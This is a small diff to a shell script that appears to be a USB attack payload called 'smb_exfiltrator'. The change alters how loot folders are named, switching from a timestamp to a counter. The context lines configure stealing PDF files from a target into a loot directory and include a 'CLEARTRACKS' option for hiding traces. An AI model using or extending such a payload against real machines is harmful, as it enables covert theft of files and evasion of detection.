@@ -21,7 +21,6 @@
 LOOTDIR=/root/udisk/loot/smb_exfiltrator
 EXFILTRATE_FILES="*.pdf"
 CLEARTRACKS="yes" # yes or no
-DATE=$(date +%Y%m%d_%H%M%S)
 # Initialization
 LED R G 100
 
@@ -107,7 +106,7 @@ done
 
 # Move files from staging area to loot directory
 LED R G B
-mv /root/loot/smb_exfiltrator/temp/* $LOOTDIR/$HOST-$DATE
+mv /root/loot/smb_exfiltrator/temp/* $LOOTDIR/$HOST-$COUNT
 sync; sleep 1; sync
 
 # Trap is clean
